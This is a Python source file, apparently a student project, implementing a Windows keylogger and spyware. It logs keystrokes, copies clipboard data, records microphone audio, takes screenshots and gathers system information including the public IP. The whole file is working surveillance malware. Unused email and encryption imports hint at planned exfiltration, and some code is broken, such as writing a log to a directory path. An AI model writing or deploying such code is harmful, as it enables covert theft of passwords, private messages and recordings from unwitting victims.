from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import platform

import win32clipboard

import pynput.keyboard
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd
from requests import get

from cryptography.fernet import Fernet

import getpass
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 7

username = getpass.getuser()

key = "keylogger"  # Generate an encryption key from the Cryptography folder

file_path = "C:\\Users\\mini project\\result"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could be not be copied")

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    if len(log) >= 50:
        save_log()
        log = ""

    with open("keylog.txt", "a") as f:
        f.write(log)
        f.close()

def save_log():
    file_path = "C:\\Users\\mini project\\result"
    with open(file_path, "a") as f:
        f.write(log)

def keylogger():
    global log
    log = ""
    keyboard_listener = Listener(on_press=process_key_press)
    with keyboard_listener:
        keyboard_listener.join()

def main():
    computer_information()
    copy_clipboard()
    microphone()
    screenshot()
    keylogger()

if __name__ == "__main__":
    main()
